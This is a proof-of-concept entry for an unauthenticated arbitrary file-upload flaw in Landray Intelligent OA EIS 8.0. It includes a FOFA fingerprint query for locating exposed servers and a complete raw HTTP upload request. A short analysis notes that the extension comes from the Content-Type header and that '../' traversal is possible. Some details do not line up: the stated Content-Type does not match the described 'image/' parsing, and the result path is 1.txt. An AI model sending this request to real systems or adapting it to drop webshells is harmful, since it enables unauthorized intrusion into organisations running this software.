---
title: Landray EIS 8.0 Front-End File Upload
---
# Landray EIS 8.0 Front-End File Upload

## Vulnerable Vendor

Landray   

## Vendor Website

https://www.landray.com.cn/

## Product

Landray Intelligent OA EIS 8.0 

https://www.landray.com.cn/blue?target=zhinengoa

## FOFA Syntax

```
icon_hash="953405444" 
```

## POC

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=jh3g1b45deo2ny55kmxl4355; Lang=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUtvHzp8FchbbUUn
Content-Length: 483
 
------WebKitFormBoundaryZUtvHzp8FchbbUUn
Content-Disposition: form-data; name="file"filename="test.jpg"
Content-Type: text/html


111
------WebKitFormBoundaryZUtvHzp8FchbbUUn--
```

File path: `Scripts/plupload/1.txt`

Vulnerability analysis:

There is a `SvaeImg` method under `/eis/service/api.aspx`.

When `action=saveimg`, execution enters the following branch.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624172207322.png)

This is a simple file upload vulnerability. It takes the IO stream from the `file` parameter, then uses a timestamp plus the `ext` variable.

Here, the variable takes the content after `image`/ in the `Content-Type` header. Because `web.config` defines some paths that can be accessed without login:

`../` can be used for cross-directory bypass.

Access `/eis/service/api.aspx?action=saveImg`.

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624172523693.png)
